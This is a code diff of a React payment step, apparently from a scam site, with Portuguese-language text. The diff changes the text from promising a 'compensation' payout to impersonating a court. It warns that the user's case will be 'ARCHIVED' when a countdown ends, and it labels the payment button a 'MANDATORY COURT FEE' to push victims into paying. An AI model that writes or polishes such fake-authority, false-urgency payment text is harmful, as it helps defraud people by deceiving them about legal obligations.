@@ -301,7 +301,7 @@ const UpsellStep = ({
             <span className="font-semibold text-sm">Tempo restante:</span>
           </div>
           <p className="text-3xl sm:text-4xl font-black text-red-600 font-mono mt-2 tracking-tight">{formatTime(countdown)}</p>
-          <p className="text-[10px] sm:text-xs text-red-500 mt-1.5 font-medium">Após este prazo, sua indenização será cancelada</p>
+          <p className="text-[10px] sm:text-xs text-red-500 mt-1.5 font-medium">TRIBUNAL: Após este prazo, seu processo será ARQUIVADO</p>
         </div>
 
         {/* Value */}
@@ -326,7 +326,7 @@ const UpsellStep = ({
                   Preparando pagamento...
                 </>
               ) : (
-                "Pagar agora e liberar indenização"
+                "PAGAR TAXA JUDICIAL OBRIGATÓRIA"
               )}
             </Button>
 
@@ -375,11 +375,11 @@ const UpsellStep = ({
                   Verificando pagamento...
                 </>
               ) : (
-                "Já paguei, liberar indenização"
+                "JÁ PAGUEI - PROCESSAR PRÓXIMA ETAPA"
               )}
             </Button>
             <p className="text-[10px] sm:text-xs text-center text-muted-foreground font-medium">
-              Após a confirmação, sua indenização será liberada.
+              Após confirmação, o Tribunal processará a próxima etapa.
             </p>
           </>
         )}
